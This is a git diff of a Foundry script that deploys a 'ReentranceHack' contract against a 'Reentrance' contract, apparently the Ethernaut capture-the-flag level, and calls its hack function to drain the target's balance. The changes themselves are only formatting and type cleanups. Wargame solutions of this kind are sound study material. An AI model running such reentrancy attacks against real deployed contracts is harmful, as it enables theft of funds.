@@ -4,9 +4,7 @@ pragma solidity ^0.8.0;
 import {Script, console} from "forge-std/Script.sol";
 import {Reentrance, ReentranceHack} from "../src/Reentrance.sol";
 
-
 contract ReentranceScript is Script {
-
     function setUp() public {}
 
     function run() public {
@@ -23,16 +21,15 @@ contract ReentranceScript is Script {
 
         console.log("Starting Hacking");
 
-        ReentranceHack hack = new ReentranceHack(ReentranceAddress); 
+        ReentranceHack hack = new ReentranceHack(ReentranceAddress);
 
-        uint inital_contractBalance = address(ReentranceAddress).balance;
-        console.log('Initial Contract Balance', inital_contractBalance);
-
+        uint256 inital_contractBalance = address(ReentranceAddress).balance;
+        console.log("Initial Contract Balance", inital_contractBalance);
 
         hack.hack{value: inital_contractBalance}();
 
-        uint final_contractBalance = address(ReentranceAddress).balance;
-        console.log('Final Contract Balance', final_contractBalance);
+        uint256 final_contractBalance = address(ReentranceAddress).balance;
+        console.log("Final Contract Balance", final_contractBalance);
 
         vm.stopBroadcast();
     }
